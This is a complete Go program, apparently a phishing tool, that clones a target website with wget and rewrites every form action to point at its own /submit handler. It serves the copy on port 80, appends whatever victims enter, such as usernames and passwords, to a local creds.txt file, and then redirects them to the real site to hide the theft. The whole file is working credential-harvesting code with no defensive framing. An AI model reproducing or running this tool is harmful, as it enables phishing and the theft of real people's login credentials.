package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strings"
	"syscall"
)

var url string
var port string

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func clone(url string) {
	_ = os.Remove("index.html")
	cmd := "wget"
	args := []string{"--no-check-certificate",
		"-O", "index.html",
		"-c",
		"-k",
		"-U", "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'",
		url}
	if err := exec.Command(cmd, args...).Run(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	findForm()
}

func findForm() {
	read, err := ioutil.ReadFile("index.html")
	if err != nil {
		panic(err)
	}

	re := regexp.MustCompile(`action=".*"`)
	str := string(read)
	substitution := `action="/submit"`

	newContent := re.ReplaceAllString(str, substitution)

	err = ioutil.WriteFile("index.html", []byte(newContent), 0)
	if err != nil {
		panic(err)
	}
}

func viewHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadFile("index.html")
	w.Write(body)
}

func saveHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	var buffer bytes.Buffer
	buffer.WriteString(url + "\n")
	for k, v := range r.Form {
		buffer.WriteString(k + ":" + strings.Join(v, " "))
		buffer.WriteString("\n")
	}
	buffer.WriteString("\n")
	filename := "./creds.txt"
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	check(err)
	defer file.Close()
	_, err = file.WriteString(buffer.String())
	check(err)
	http.Redirect(w, r, url, http.StatusFound)
}

func serve(port string) {
	http.HandleFunc("/", viewHandler)
	http.HandleFunc("/submit", saveHandler)
	http.ListenAndServe(":"+port, nil)
}

func main() {
	flag.StringVar(&url, "url", "http://site.com", "Site to clone")
	flag.StringVar(&port, "port", "80", "Port to listen on")
	flag.Parse()

	clone(url)
	go serve(port)

	sigs := make(chan os.Signal, 1)
	done := make(chan bool, 1)

	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		_ = <-sigs
		fmt.Println()
		// fmt.Println(sig)
		done <- true
	}()

	fmt.Println("webserver running... CTRL-C to stop")
	<-done
	fmt.Println("exiting...")
}
